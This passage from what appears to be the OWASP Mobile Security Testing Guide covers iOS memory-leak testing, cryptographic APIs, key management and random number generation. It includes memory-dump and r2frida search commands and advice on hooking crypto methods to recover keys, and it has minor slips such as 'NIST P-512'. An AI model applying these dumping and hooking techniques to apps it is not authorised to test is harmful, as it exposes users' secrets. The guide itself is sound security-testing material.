[+]   /private/var/mobile/Containers/Data/Application/APP_ID/Library/Caches/Snapshots/app_name/downscaled/12B93BCB-610B-44DA-A171-AF205BA71269@2x.png
[+] Retrieving screenshots and saving them in: /home/user/.needle/output
\end{verbatim}

If the application caches the sensitive information in a screenshot, the
app fails this test.

The application should show a default image as the top view element when
the application enters the background, so that the default image will be
cached and not the sensitive information that was displayed.

\hypertarget{testing-memory-for-sensitive-data-mstg-storage-10}{%
\subsubsection{Testing Memory for Sensitive Data
(MSTG-STORAGE-10)}\label{testing-memory-for-sensitive-data-mstg-storage-10}}

\hypertarget{overview-53}{%
\paragraph{Overview}\label{overview-53}}

Analyzing memory can help developers to identify the root causes of
problems such as application crashes. However, it can also be used to
access to sensitive data. This section describes how to check process'
memory for data disclosure.

First, identify the sensitive information that's stored in memory.
Sensitive assets are very likely to be loaded into memory at some point.
The objective is to make sure that this info is exposed as briefly as
possible.

To investigate an application's memory, first create a memory dump.
Alternatively, you can analyze the memory in real time with, for
example, a debugger. Regardless of the method you use, this is a very
error-prone process because dumps provide the data left by executed
functions and you might miss executing critical steps. In addition,
overlooking data during analysis is quite easy to do unless you know the
footprint of the data you're looking for (either its exact value or its
format). For example, if the app encrypts according to a randomly
generated symmetric key, you're very unlikely to spot the key in memory
unless you find its value by other means.

Therefore, you're better off starting with static analysis.

\hypertarget{static-analysis-60}{%
\paragraph{Static Analysis}\label{static-analysis-60}}

Before looking into the source code, checking the documentation and
identifying application components provide an overview of where data
might be exposed. For example, while sensitive data received from a
backend exists in the final model object, multiple copies may also exist
in the HTTP client or the XML parser. All these copies should be removed
from memory as soon as possible.

Understanding the application's architecture and its interaction with
the OS will help you identify sensitive information that doesn't have to
be exposed in memory at all. For example, assume your app receives data
from one server and transfers it to another without needing any
additional processing. That data can be received and handled in
encrypted form, which prevents exposure via memory.

However, if sensitive data \emph{does} need to be exposed via memory,
make sure that your app exposes as few copies of this data as possible
for as little time as possible. In other words, you want centralized
handling of sensitive data, based on primitive and mutable data
structures.

Such data structures give developers direct access to memory. Make sure
that this access is used to overwrite the sensitive data with dummy data
(which is typically zeroes). Examples of preferable data types include
\texttt{char\ {[}{]}} and \texttt{int\ {[}{]}}, but not
\texttt{NSString} or \texttt{String}. Whenever you try to modify an
immutable object, such as a \texttt{String}, you actually create a copy
and change the copy.

Avoid Swift data types other than collections regardless of whether they
are considered mutable. Many Swift data types hold their data by value,
not by reference. Although this allows modification of the memory
allocated to simple types like \texttt{char} and \texttt{int}, handling
a complex type such as \texttt{String} by value involves a hidden layer
of objects, structures, or primitive arrays whose memory can't be
directly accessed or modified. Certain types of usage may seem to create
a mutable data object (and even be documented as doing so), but they
actually create a mutable identifier (variable) instead of an immutable
identifier (constant). For example, many think that the following
results in a mutable \texttt{String} in Swift, but this is actually an
example of a variable whose complex value can be changed (replaced, not
modified in place):

\begin{verbatim}
var str1 = "Goodbye"              // "Goodbye", base address:            0x0001039e8dd0
str1.append(" ")                 // "Goodbye ", base address:            0x608000064ae0
str1.append("cruel world!")      // "Goodbye cruel world", base address: 0x6080000338a0
str1.removeAll()                 // "", base address                    0x00010bd66180
\end{verbatim}

Notice that the base address of the underlying value changes with each
string operation. Here is the problem: To securely erase the sensitive
information from memory, we don't want to simply change the value of the
variable; we want to change the actual content of the memory allocated
for the current value. Swift doesn't offer such a function.

Swift collections (\texttt{Array}, \texttt{Set}, and
\texttt{Dictionary}), on the other hand, may be acceptable if they
collect primitive data types such as \texttt{char} or \texttt{int} and
are defined as mutable (i.e., as variables instead of constants), in
which case they are more or less equivalent to a primitive array (such
as \texttt{char\ {[}{]}}). These collections provide memory management,
which can result in unidentified copies of the sensitive data in memory
if the collection needs to copy the underlying buffer to a different
location to extend it.

Using mutable Objective-C data types, such as \texttt{NSMutableString},
may also be acceptable, but these types have the same memory issue as
Swift collections. Pay attention when using Objective-C collections;
they hold data by reference, and only Objective-C data types are
allowed. Therefore, we are looking, not for a mutable collection, but
for a collection that references mutable objects.

As we've seen so far, using Swift or Objective-C data types requires a
deep understanding of the language implementation. Furthermore, there
has been some core re-factoring in between major Swift versions,
resulting in many data types' behavior being incompatible with that of
other types. To avoid these issues, we recommend using primitive data
types whenever data needs to be securely erased from memory.

Unfortunately, few libraries and frameworks are designed to allow
sensitive data to be overwritten. Not even Apple considers this issue in
the official iOS SDK API. For example, most of the APIs for data
transformation (passers, serializes, etc.) operate on non-primitive data
types. Similarly, regardless of whether you flag some
\texttt{UITextField} as \emph{Secure Text Entry} or not, it always
returns data in the form of a \texttt{String} or \texttt{NSString}.

In summary, when performing static analysis for sensitive data exposed
via memory, you should

\begin{itemize}
\tightlist
\item
  try to identify application components and map where the data is used,
\item
  make sure that sensitive data is handled with as few components as
  possible,
\item
  make sure that object references are properly removed once the object
  containing sensitive data is no longer needed,
\item
  make sure that highly sensitive data is overwritten as soon as it is
  no longer needed,
\item
  not pass such data via immutable data types, such as \texttt{String}
  and \texttt{NSString},
\item
  avoid non-primitive data types (because they might leave data behind),
\item
  overwrite the value in memory before removing references,
\item
  pay attention to third-party components (libraries and frameworks).
  Having a public API that handles data according to the recommendations
  above is a good indicator that developers considered the issues
  discussed here.
\end{itemize}

\hypertarget{dynamic-analysis-57}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-57}}

There are several approaches and tools available for dynamically testing
the memory of an iOS app for sensitive data.

\hypertarget{retrieving-and-analyzing-a-memory-dump-1}{%
\subparagraph{Retrieving and Analyzing a Memory
Dump}\label{retrieving-and-analyzing-a-memory-dump-1}}

Wether you are using a jailbroken or a non-jailbroken device, you can
dump the app's process memory with
\href{https://github.com/sensepost/objection}{objection} and
\href{https://github.com/Nightbringer21/fridump}{Fridump}. You can find
a detailed explanation of this process in the section
``\href{0x06c-Reverse-Engineering-and-Tampering.md\#memory-dump}{Memory
Dump}'', in the chapter ``Tampering and Reverse Engineering on iOS''.

After the memory has been dumped (e.g.~to a file called ``memory''),
depending on the nature of the data you're looking for, you'll need a
set of different tools to process and analyze that memory dump. For
instance, if you're focusing on strings, it might be sufficient for you
to execute the command \texttt{strings} or \texttt{rabin2\ -zz} to
extract those strings.

\begin{verbatim}
# using strings
$ strings memory > strings.txt

# using rabin2
$ rabin2 -ZZ memory > strings.txt
\end{verbatim}

Open \texttt{strings.txt} in your favorite editor and dig through it to
identify sensitive information.

However if you'd like to inspect other kind of data, you'd rather want
to use radare2 and its search capabilities. See radare2's help on the
search command (\texttt{/?}) for more information and a list of options.
The following shows only a subset of them:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ }\ExtensionTok{r2} \OperatorTok{<}\NormalTok{name\_of\_your\_dump\_file}\OperatorTok{>}

\NormalTok{[}\ExtensionTok{0x00000000}\NormalTok{]}\OperatorTok{>}\NormalTok{ /?}
\ExtensionTok{Usage}\NormalTok{: /[!bf] [arg]  Search stuff (see }\StringTok{\textquotesingle{}e??search\textquotesingle{}}\NormalTok{ for options)}
\KeywordTok{|}\ExtensionTok{Use}\NormalTok{ io.va for searching in non virtual addressing spaces}
\KeywordTok{|} \ExtensionTok{/}\NormalTok{ foo\textbackslash{}x00                    search for string }\StringTok{\textquotesingle{}foo\textbackslash{}0\textquotesingle{}}
\KeywordTok{|}\NormalTok{ /}\ExtensionTok{c}\NormalTok{[ar]                       search for crypto materials}
\KeywordTok{|} \ExtensionTok{/e}\NormalTok{ /E.F/i                    match regular expression}
\KeywordTok{|} \ExtensionTok{/i}\NormalTok{ foo                       search for string }\StringTok{\textquotesingle{}foo\textquotesingle{}}\NormalTok{ ignoring case}
\KeywordTok{|}\NormalTok{ /}\ExtensionTok{m}\NormalTok{[?][ebm] magicfile         search for magic, filesystems or binary headers}
\KeywordTok{|}\NormalTok{ /}\ExtensionTok{v}\NormalTok{[1248] value               look for an }\KeywordTok{\textasciigrave{}}\ExtensionTok{cfg.bigendian}\KeywordTok{\textasciigrave{}}\NormalTok{ 32bit value}
\KeywordTok{|} \ExtensionTok{/w}\NormalTok{ foo                       search for wide string }\StringTok{\textquotesingle{}f\textbackslash{}0o\textbackslash{}0o\textbackslash{}0\textquotesingle{}}
\KeywordTok{|} \ExtensionTok{/x}\NormalTok{ ff0033                    search for hex string}
\KeywordTok{|} \ExtensionTok{/z}\NormalTok{ min max                   search for strings of given size}
\ExtensionTok{...}
\end{Highlighting}
\end{Shaded}

\hypertarget{runtime-memory-analysis-1}{%
\subparagraph{Runtime Memory Analysis}\label{runtime-memory-analysis-1}}

Using r2frida you can analyze and inspect the app's memory while running
and without needing to dump it. For example, you may run the previous
search commands from r2frida and search the memory for a string,
hexadecimal values, etc. When doing so, remember to prepend the search
command (and any other r2frida specific commands) with a backslash
\texttt{\textbackslash{}} after starting the session with
\texttt{r2\ frida://usb//\textless{}name\_of\_your\_app\textgreater{}}.

For more information, options and approaches, please refer to section
``\href{0x06c-Reverse-Engineering-and-Tampering.md\#in-memory-search}{In-Memory
Search}'' in the chapter ``Tampering and Reverse Engineering on iOS''.

\hypertarget{references-18}{%
\subsubsection{References}\label{references-18}}

\hypertarget{owasp-masvs-13}{%
\paragraph{OWASP MASVS}\label{owasp-masvs-13}}

\begin{itemize}
\tightlist
\item
  MSTG-STORAGE-1: ``System credential storage facilities need to be used
  to store sensitive data, such as PII, user credentials or
  cryptographic keys.''
\item
  MSTG-STORAGE-2: ``No sensitive data should be stored outside of the
  app container or system credential storage facilities.''
\item
  MSTG-STORAGE-3: ``No sensitive data is written to application logs.''
\item
  MSTG-STORAGE-4: ``No sensitive data is shared with third parties
  unless it is a necessary part of the architecture.''
\item
  MSTG-STORAGE-5: ``The keyboard cache is disabled on text inputs that
  process sensitive data.''
\item
  MSTG-STORAGE-6: ``No sensitive data is exposed via IPC mechanisms.''
\item
  MSTG-STORAGE-7: ``No sensitive data, such as passwords or pins, is
  exposed through the user interface.''
\item
  MSTG-STORAGE-8: ``No sensitive data is included in backups generated
  by the mobile operating system.''
\item
  MSTG-STORAGE-9: ``The app removes sensitive data from views when moved
  to the background.''
\item
  MSTG-STORAGE-10: ``The app does not hold sensitive data in memory
  longer than necessary, and memory is cleared explicitly after use.''
\end{itemize}

\hypertarget{tools-11}{%
\paragraph{Tools}\label{tools-11}}

\begin{itemize}
\tightlist
\item
  Fridump - \url{https://github.com/Nightbringer21/fridump}
\item
  Objection - \url{https://github.com/sensepost/objection}
\item
  OWASP ZAP -
  \url{https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project}
\item
  Burp Suite - \url{https://portswigger.net/burp}
\item
  Firebase Scanner - \url{https://github.com/shivsahni/FireBaseScanner}
\end{itemize}

\hypertarget{others-1}{%
\paragraph{Others}\label{others-1}}

\begin{itemize}
\tightlist
\item
  {[}\#mandt{]} Tarjei Mandt, Mathew Solnik and David Wang, Demystifying
  the Secure Enclave Processor -
  \url{https://www.blackhat.com/docs/us-16/materials/us-16-Mandt-Demystifying-The-Secure-Enclave-Processor.pdf}
\end{itemize}

\hypertarget{ios-cryptographic-apis}{%
\subsection{iOS Cryptographic APIs}\label{ios-cryptographic-apis}}

In the ``Cryptography for Mobile Apps'' chapter, we introduced general
cryptography best practices and described typical problems that may
occur when cryptography is used incorrectly. In this chapter, we'll
detail the cryptography APIs available for iOS. We'll show how to
identify usage of those APIs in the source code and how to interpret
cryptographic configurations. When you're reviewing code, compare the
cryptographic parameters with the current best practices linked in this
guide.

\hypertarget{verifying-the-configuration-of-cryptographic-standard-algorithms-mstg-crypto-2-and-mstg-crypto-3}{%
\subsubsection{Verifying the Configuration of Cryptographic Standard
Algorithms (MSTG-CRYPTO-2 and
MSTG-CRYPTO-3)}\label{verifying-the-configuration-of-cryptographic-standard-algorithms-mstg-crypto-2-and-mstg-crypto-3}}

\hypertarget{overview-54}{%
\paragraph{Overview}\label{overview-54}}

Apple provides libraries that include implementations of most common
cryptographic algorithms.
\href{https://developer.apple.com/library/content/documentation/Security/Conceptual/cryptoservices/GeneralPurposeCrypto/GeneralPurposeCrypto.html}{Apple's
Cryptographic Services Guide} is a great reference. It contains
generalized documentation of how to use standard libraries to initialize
and use cryptographic primitives, information that is useful for source
code analysis.

\hypertarget{cryptokit}{%
\subparagraph{CryptoKit}\label{cryptokit}}

Apple CryptoKit was released with iOS 13 and is built on top of Apple's
native cryptographic library \texttt{corecrypto}. The Swift framework
provides a strongly typed API interface, has effective memory
management, conforms to equatable, and supports generics. CryptoKit
contains secure algorithms for hashing, symmetric-key cryptography, and
public-key cryptography. The framework can also utilize the hardware
based key manager from the Secure Enclave.

Apple CryptoKit contains the following algorithms:

\emph{Hashes} - MD5 (Insecure Module) - SHA1 (Insecure Module) - SHA-2
256-bit digest - SHA-2 384-bit digest - SHA-2 512-bit digest

\emph{Symmetric-Key} - Message Authentication Codes (HMAC) -
Authenticated Encryption - AES-GCM - ChaCha20-Poly1305

\emph{Public-Key} - Key Agreement - Curve25519 - NIST P-256 - NIST P-384
- NIST P-512

Examples:

Generating and releasing a symmetric key:

\begin{verbatim}
let encryptionKey = SymmetricKey(size: .bits256)
\end{verbatim}

Calculating a SHA-2 512-bit digest:

\begin{verbatim}
let rawString = "OWASP MTSG"
let rawData = Data(rawString.utf8)
let hash = SHA512.hash(data: rawData) // Compute the digest
let textHash = String(describing: hash)
print(textHash) // Print hash text
\end{verbatim}

For more information about Apple CryptoKit, please visit the following
resources:

\begin{itemize}
\tightlist
\item
  \href{https://developer.apple.com/documentation/cryptokit}{Apple
  CryptoKit \textbar{} Apple Developer Documentation}
\item
  \href{https://developer.apple.com/documentation/cryptokit/performing_common_cryptographic_operations}{Performing
  Common Cryptographic Operations \textbar{} Apple Developer
  Documentation}
\item
  \href{https://developer.apple.com/videos/play/wwdc19/709/}{WWDC 2019
  session 709 \textbar{} Cryptography and Your Apps}
\item
  \href{https://www.hackingwithswift.com/example-code/cryptokit/how-to-calculate-the-sha-hash-of-a-string-or-data-instance}{How
  to calculate the SHA hash of a String or Data instance \textbar{}
  Hacking with Swift}
\end{itemize}

\hypertarget{commoncrypto-seckeyencrypt-and-wrapper-libraries}{%
\subparagraph{CommonCrypto, SecKeyEncrypt and Wrapper
libraries}\label{commoncrypto-seckeyencrypt-and-wrapper-libraries}}

The most commonly used Class for cryptographic operations is the
CommonCrypto, which is packed with the iOS runtime. The functionality
offered by the CommonCrypto object can best be dissected by having a
look at the
\href{https://opensource.apple.com/source/CommonCrypto/CommonCrypto-36064/CommonCrypto/CommonCryptor.h.auto.html}{source
code of the header file}:

\begin{itemize}
\tightlist
\item
  The \texttt{Commoncryptor.h} gives the parameters for the symmetric
  cryptographic operations.
\item
  The \texttt{CommonDigest.h} gives the parameters for the hashing
  Algorithms.
\item
  The \texttt{CommonHMAC.h} gives the parameters for the supported HMAC
  operations.
\item
  The \texttt{CommonKeyDerivation.h} gives the parameters for supported
  KDF functions.
\item
  The \texttt{CommonSymmetricKeywrap.h} gives the function used for
  wrapping a symmetric key with a Key Encryption Key.
\end{itemize}

Unfortunately, CommonCryptor lacks a few types of operations in its
public APIs, such as: GCM mode is only available in its private APIs See
\href{https://opensource.apple.com/source/CommonCrypto/CommonCrypto-60074/include/CommonCryptorSPI.h}{its
source code}. For this, an additional binding header is necessary or
other wrapper libraries can be used.

Next, for asymmetric operations, Apple provides
\href{https://opensource.apple.com/source/Security/Security-57740.51.3/keychain/SecKey.h.auto.html}{SecKey}.
Apple provides a nice guide in its
\href{https://developer.apple.com/documentation/security/certificate_key_and_trust_services/keys/using_keys_for_encryption}{Developer
Documentation} on how to use this.

As noted before: some wrapper-libraries exist for both in order to
provide convenience. Typical libraries that are used are, for instance:

\begin{itemize}
\tightlist
\item
  \href{https://github.com/iosdevzone/IDZSwiftCommonCrypto}{IDZSwiftCommonCrypto}
\item
  \href{https://github.com/henrinormak/Heimdall}{Heimdall}
\item
  \href{https://github.com/TakeScoop/SwiftyRSA}{SwiftyRSA}
\item
  \href{https://github.com/SwiftP2P/SwiftSSL}{SwiftSSL}
\item
  \href{https://github.com/RNCryptor/RNCryptor}{RNCryptor}
\item
  \href{https://github.com/onmyway133/Arcane}{Arcane}
\end{itemize}

\hypertarget{third-party-libraries-1}{%
\subparagraph{Third party libraries}\label{third-party-libraries-1}}

There are various third party libraries available, such as:

\begin{itemize}
\tightlist
\item
  \textbf{CJOSE}: With the rise of JWE, and the lack of public support
  for AES GCM, other libraries have found their way, such as
  \href{https://github.com/cisco/cjose}{CJOSE}. CJOSE still requires a
  higher level wrapping as they only provide a C/C++ implementation.
\item
  \textbf{CryptoSwift}: A library in Swift, which can be found at
  \href{https://github.com/krzyzanowskim/CryptoSwift}{GitHub}. The
  library supports various hash-functions, MAC-functions, CRC-functions,
  symmetric ciphers, and password-based key derivation functions. It is
  not a wrapper, but a fully self-implemented version of each of the
  ciphers. It is important to verify the effective implementation of a
  function.
\item
  \textbf{OpenSSL}: \href{https://www.openssl.org/}{OpenSSL} is the
  toolkit library used for TLS, written in C. Most of its cryptographic
  functions can be used to do the various cryptographic actions
  necessary, such as creating (H)MACs, signatures, symmetric- \&
  asymmetric ciphers, hashing, etc.. There are various wrappers, such as
  \href{https://github.com/ZewoGraveyard/OpenSSL}{OpenSSL} and
  \href{https://github.com/hohl/MIHCrypto}{MIHCrypto}.
\item
  \textbf{LibSodium}: Sodium is a modern, easy-to-use software library
  for encryption, decryption, signatures, password hashing and more. It
  is a portable, cross-compilable, installable, packageable fork of
  NaCl, with a compatible API, and an extended API to improve usability
  even further. See
  \href{https://download.libsodium.org/doc/installation}{LibSodiums
  documentation} for more details. There are some wrapper libraries,
  such as \href{https://github.com/jedisct1/swift-sodium}{Swift-sodium},
  \href{https://github.com/gabriel/NAChloride}{NAChloride}, and
  \href{https://github.com/mochtu/libsodium-ios}{libsodium-ios}.
\item
  \textbf{Tink}: A new cryptography library by Google. Google explains
  its reasoning behind the library
  \href{https://security.googleblog.com/2018/08/introducing-tink-cryptographic-software.html}{on
  its security blog}. The sources can be found at
  \href{https://github.com/google/tink}{Tinks GitHub repository}.
\item
  \textbf{Themis}: a Crypto library for storage and messaging for Swift,
  Obj-C, Android/Java, С++, JS, Python, Ruby, PHP, Go.
  \href{https://github.com/cossacklabs/themis}{Themis} uses
  LibreSSL/OpenSSL engine libcrypto as a dependency. It supports
  Objective-C and Swift for key generation, secure messaging
  (e.g.~payload encryption and signing), secure storage and setting up a
  secure session. See
  \href{https://github.com/cossacklabs/themis/wiki/Objective-C-Howto}{their
  wiki} for more details.
\item
  \textbf{Others}: There are many other libraries, such as
  \href{https://github.com/kelp404/CocoaSecurity}{CocoaSecurity},
  \href{https://github.com/ideawu/Objective-C-RSA}{Objective-C-RSA}, and
  \href{https://github.com/aerogear/aerogear-ios-crypto}{aerogear-ios-crypto}.
  Some of these are no longer maintained and might never have been
  security reviewed. Like always, it is recommended to look for
  supported and maintained libraries.
\item
  \textbf{DIY}: An increasing amount of developers have created their
  own implementation of a cipher or a cryptographic function. This
  practice is \emph{highly} discouraged and should be vetted very
  thoroughly by a cryptography expert if used.
\end{itemize}

\hypertarget{static-analysis-61}{%
\paragraph{Static Analysis}\label{static-analysis-61}}

A lot has been said about deprecated algorithms and cryptographic
configurations in section \texttt{Cryptography\ for\ Mobile\ Apps}.
Obviously, these should be verified for each of the mentioned libraries
in this chapter. Pay attention to how-to-be-removed key-holding
datastructures and plain-text data structures are defined. If the
keyword \texttt{let} is used, then you create an immutable structure
which is harder to wipe from memory. Make sure that it is part of a
parent structure which can be easily removed from memory (e.g.~a
\texttt{struct} that lives temporally).

\hypertarget{commoncryptor}{%
\subparagraph{CommonCryptor}\label{commoncryptor}}

If the app uses standard cryptographic implementations provided by
Apple, the easiest way to determine the status of the related algorithm
is to check for calls to functions from \texttt{CommonCryptor}, such as
\texttt{CCCrypt} and \texttt{CCCryptorCreate}. The
\href{https://opensource.apple.com/source/CommonCrypto/CommonCrypto-36064/CommonCrypto/CommonCryptor.h}{source
code} contains the signatures of all functions of CommonCryptor.h. For
instance, \texttt{CCCryptorCreate} has following signature:

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{CCCryptorStatus CCCryptorCreate(}
\NormalTok{    CCOperation op,             }\CommentTok{/* kCCEncrypt, etc. */}
\NormalTok{    CCAlgorithm alg,            }\CommentTok{/* kCCAlgorithmDES, etc. */}
\NormalTok{    CCOptions options,          }\CommentTok{/* kCCOptionPKCS7Padding, etc. */}
    \DataTypeTok{const} \DataTypeTok{void}\NormalTok{ *key,            }\CommentTok{/* raw key material */}
    \DataTypeTok{size\_t}\NormalTok{ keyLength,}
    \DataTypeTok{const} \DataTypeTok{void}\NormalTok{ *iv,             }\CommentTok{/* optional initialization vector */}
\NormalTok{    CCCryptorRef *cryptorRef);  }\CommentTok{/* RETURNED */}
\end{Highlighting}
\end{Shaded}

You can then compare all the \texttt{enum} types to determine which
algorithm, padding, and key material is used. Pay attention to the
keying material: the key should be generated securely - either using a
key derivation function or a random-number generation function. Note
that functions which are noted in chapter ``Cryptography for Mobile
Apps'' as deprecated, are still programmatically supported. They should
not be used.

\hypertarget{third-party-libraries-2}{%
\subparagraph{Third party libraries}\label{third-party-libraries-2}}

Given the continuous evolution of all third party libraries, this should
not be the place to evaluate each library in terms of static analysis.
Still there are some points of attention:

\begin{itemize}
\tightlist
\item
  \textbf{Find the library being used}: This can be done using the
  following methods:

  \begin{itemize}
  \tightlist
  \item
    Check the
    \href{https://github.com/Carthage/Carthage/blob/master/Documentation/Artifacts.md\#cartfile}{cartfile}
    if Carthage is used.
  \item
    Check the
    \href{https://guides.cocoapods.org/syntax/podfile.html}{podfile} if
    Cocoapods is used.
  \item
    Check the linked libraries: Open the xcodeproj file and check the
    project properties. Go to the \textbf{Build Phases} tab and check
    the entries in \textbf{Link Binary With Libraries} for any of the
    libraries. See earlier sections on how to obtain similar information
    using
    \href{https://github.com/MobSF/Mobile-Security-Framework-MobSF}{MobSF}.
  \item
    In the case of copy-pasted sources: search the headerfiles (in case
    of using Objective-C) and otherwise the Swift files for known
    methodnames for known libraries.
  \end{itemize}
\item
  \textbf{Determine the version being used}: Always check the version of
  the library being used and check whether there is a new version
  available in which possible vulnerabilities or shortcomings are
  patched. Even without a newer version of a library, it can be the case
  that cryptographic functions have not been reviewed yet. Therefore we
  always recommend using a library that has been validated or ensure
  that you have the ability, knowledge and experience to do validation
  yourself.
\item
  \textbf{By hand?}: We recommend not to roll your own crypto, nor to
  implement known cryptographic functions yourself.
\end{itemize}

\hypertarget{testing-key-management-mstg-crypto-1-and-mstg-crypto-5}{%
\subsubsection{Testing Key Management (MSTG-CRYPTO-1 and
MSTG-CRYPTO-5)}\label{testing-key-management-mstg-crypto-1-and-mstg-crypto-5}}

\hypertarget{overview-55}{%
\paragraph{Overview}\label{overview-55}}

There are various methods on how to store the key on the device. Not
storing a key at all will ensure that no key material can be dumped.
This can be achieved by using a Password Key Derivation function, such
as PKBDF-2. See the example below:

\begin{verbatim}
func pbkdf2SHA1(password: String, salt: Data, keyByteCount: Int, rounds: Int) -> Data? {
    return pbkdf2(hash: CCPBKDFAlgorithm(kCCPRFHmacAlgSHA1), password: password, salt: salt, keyByteCount: keyByteCount, rounds: rounds)
}

func pbkdf2SHA256(password: String, salt: Data, keyByteCount: Int, rounds: Int) -> Data? {
    return pbkdf2(hash: CCPBKDFAlgorithm(kCCPRFHmacAlgSHA256), password: password, salt: salt, keyByteCount: keyByteCount, rounds: rounds)
}

func pbkdf2SHA512(password: String, salt: Data, keyByteCount: Int, rounds: Int) -> Data? {
    return pbkdf2(hash: CCPBKDFAlgorithm(kCCPRFHmacAlgSHA512), password: password, salt: salt, keyByteCount: keyByteCount, rounds: rounds)
}

func pbkdf2(hash: CCPBKDFAlgorithm, password: String, salt: Data, keyByteCount: Int, rounds: Int) -> Data? {
    let passwordData = password.data(using: String.Encoding.utf8)!
    var derivedKeyData = Data(repeating: 0, count: keyByteCount)
    let derivedKeyDataLength = derivedKeyData.count
    let derivationStatus = derivedKeyData.withUnsafeMutableBytes { derivedKeyBytes in
        salt.withUnsafeBytes { saltBytes in

            CCKeyDerivationPBKDF(
                CCPBKDFAlgorithm(kCCPBKDF2),
                password, passwordData.count,
                saltBytes, salt.count,
                hash,
                UInt32(rounds),
                derivedKeyBytes, derivedKeyDataLength
            )
        }
    }
    if derivationStatus != 0 {
        // Error
        return nil
    }

    return derivedKeyData
}

func testKeyDerivation() {
    let password = "password"
    let salt = Data([0x73, 0x61, 0x6C, 0x74, 0x44, 0x61, 0x74, 0x61])
    let keyByteCount = 16
    let rounds = 100_000

    let derivedKey = pbkdf2SHA1(password: password, salt: salt, keyByteCount: keyByteCount, rounds: rounds)
}
\end{verbatim}

\emph{Source:
\url{https://stackoverflow.com/questions/8569555/pbkdf2-using-commoncrypto-on-ios},
tested in the test suite of the \texttt{Arcane} library}

When you need to store the key, it is recommended to use the Keychain as
long as the protection class chosen is not
\texttt{kSecAttrAccessibleAlways}. Storing keys in any other location,
such as the \texttt{NSUserDefaults}, property list files or by any other
sink from Core Data or Realm, is usually less secure than using the
KeyChain. Even when the sync of Core Data or Realm is protected by using
\texttt{NSFileProtectionComplete} data protection class, we still
recommend using the KeyChain. See the chapter
``\href{0x06d-Testing-Data-Storage.md}{Data Storage on iOS}'' for more
details.

The KeyChain supports two type of storage mechanisms: a key is either
secured by an encryption key stored in the secure-enclave or the key
itself is within the secure enclave. The latter only holds when you use
an ECDH singing key. See the
\href{https://developer.apple.com/documentation/security/certificate_key_and_trust_services/keys/storing_keys_in_the_secure_enclave}{Apple
Documentation} for more details on its implementation.

The last three options consist of using hardcoded encryption keys in the
source code, having a predictable key derivation function based on
stable attributes, and storing generated keys in places that are shared
with other applications. Using hardcoded encryption keys is obviously
not the way to go, as this would mean that every instance of the
application uses the same encryption key. An attacker needs only to do
the work once in order to extract the key from the source code (whether
stored natively or in Objective-C/Swift). Consequently, the attacker can
decrypt any other data that was encrypted by the application. Next, when
you have a predictable key derivation function based on identifiers
which are accessible to other applications, the attacker only needs to
find the KDF and apply it to the device in order to find the key.
Lastly, storing symmetric encryption keys publicly also is highly
discouraged.

Two more notions you should never forget when it comes to cryptography:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Always encrypt/verify with the public key and always decrypt/sign with
  the private key.
\item
  Never reuse the key(pair) for another purpose: this might allow
  leaking information about the key: have a separate keypair for signing
  and a separate key(pair) for encryption.
\end{enumerate}

\hypertarget{static-analysis-62}{%
\paragraph{Static Analysis}\label{static-analysis-62}}

There are various keywords to look for: check the libraries mentioned in
the overview and static analysis of the section ``Verifying the
Configuration of Cryptographic Standard Algorithms'' for which keywords
you can best check on how keys are stored.

Always make sure that:

\begin{itemize}
\tightlist
\item
  keys are not synchronized over devices if it is used to protect
  high-risk data.
\item
  keys are not stored without additional protection.
\item
  keys are not hardcoded.
\item
  keys are not derived from stable features of the device.
\item
  keys are not hidden by use of lower level languages (e.g.~C/C++).
\item
  keys are not imported from unsafe locations.
\end{itemize}

Most of the recommendations for static analysis can already be found in
chapter ``Testing Data Storage for iOS''. Next, you can read up on it at
the following pages:

\begin{itemize}
\tightlist
\item
  \href{https://developer.apple.com/documentation/security/certificate_key_and_trust_services/keys}{Apple
  Developer Documentation: Certificates and keys}
\item
  \href{https://developer.apple.com/documentation/security/certificate_key_and_trust_services/keys/generating_new_cryptographic_keys}{Apple
  Developer Documentation: Generating new keys}
\item
  \href{https://developer.apple.com/documentation/security/certificate_key_and_trust_services/keys/key_generation_attributes}{Apple
  Developer Documentation: Key generation attributes}
\end{itemize}

\hypertarget{dynamic-analysis-58}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-58}}

Hook cryptographic methods and analyze the keys that are being used.
Monitor file system access while cryptographic operations are being
performed to assess where key material is written to or read from.

\hypertarget{testing-random-number-generation-mstg-crypto-6-1}{%
\subsubsection{Testing Random Number Generation
(MSTG-CRYPTO-6)}\label{testing-random-number-generation-mstg-crypto-6-1}}

\hypertarget{overview-56}{%
\paragraph{Overview}\label{overview-56}}

Apple provides a
\href{https://developer.apple.com/reference/security/randomization_services}{Randomization
Services} API, which generates cryptographically secure random numbers.

The Randomization Services API uses the \texttt{SecRandomCopyBytes}
function to generate numbers. This is a wrapper function for the
\texttt{/dev/random} device file, which provides cryptographically
secure pseudorandom values from 0 to 255. Make sure that all random
numbers are generated with this API. There is no reason for developers
to use a different one.

\hypertarget{static-analysis-63}{%
\paragraph{Static Analysis}\label{static-analysis-63}}

In Swift, the
\href{https://developer.apple.com/reference/security/1399291-secrandomcopybytes}{\texttt{SecRandomCopyBytes}
API} is defined as follows:

\begin{verbatim}
func SecRandomCopyBytes(_ rnd: SecRandomRef?,
                      _ count: Int,
                      _ bytes: UnsafeMutablePointer<UInt8>) -> Int32
\end{verbatim}

The
\href{https://developer.apple.com/reference/security/1399291-secrandomcopybytes?language=objc}{Objective-C
version} is

\begin{verbatim}
int SecRandomCopyBytes(SecRandomRef rnd, size_t count, uint8_t *bytes);
\end{verbatim}

The following is an example of the APIs usage:

\begin{verbatim}
int result = SecRandomCopyBytes(kSecRandomDefault, 16, randomBytes);
\end{verbatim}

Note: if other mechanisms are used for random numbers in the code,
verify that these are either wrappers around the APIs mentioned above or
review them for their secure-randomness. Often this is too hard, which
means you can best stick with the implementation above.

\hypertarget{dynamic-analysis-59}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-59}}

If you want to test for randomness, you can try to capture a large set
of numbers and check with
\href{https://portswigger.net/burp/documentation/desktop/tools/sequencer}{Burp's
sequencer plugin} to see how good the quality of the randomness is.

\hypertarget{references-19}{%
\subsubsection{References}\label{references-19}}

\hypertarget{owasp-masvs-14}{%
\paragraph{OWASP MASVS}\label{owasp-masvs-14}}

\begin{itemize}
\tightlist
\item
